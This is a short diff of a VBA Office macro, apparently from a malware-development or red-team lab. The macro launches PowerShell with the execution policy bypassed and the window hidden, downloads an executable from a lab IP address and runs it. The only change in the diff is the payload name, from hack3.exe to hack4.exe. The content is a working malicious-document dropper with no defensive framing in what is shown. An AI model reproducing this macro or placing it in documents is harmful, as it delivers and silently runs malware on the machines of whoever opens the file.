@@ -1,7 +1,7 @@
 Sub MeowMacro()
     ' PowerShell ignore Execution policy
     Dim psScript As String
-    psScript = "powershell.exe -ExecutionPolicy Bypass -window-style hidden (New-Object System.Net.WebClient).DownloadFile('http://192.168.56.1:8888/hack3.exe', 'C:\temp\hack3.exe'); Start-Process C:\temp\hack3.exe"
+    psScript = "powershell.exe -ExecutionPolicy Bypass -window-style hidden (New-Object System.Net.WebClient).DownloadFile('http://192.168.56.1:8888/hack4.exe', 'C:\temp\hack4.exe'); Start-Process C:\temp\hack4.exe"
 
     ' using WScript.Shell for run PowerShell
     Dim shell_object As Object
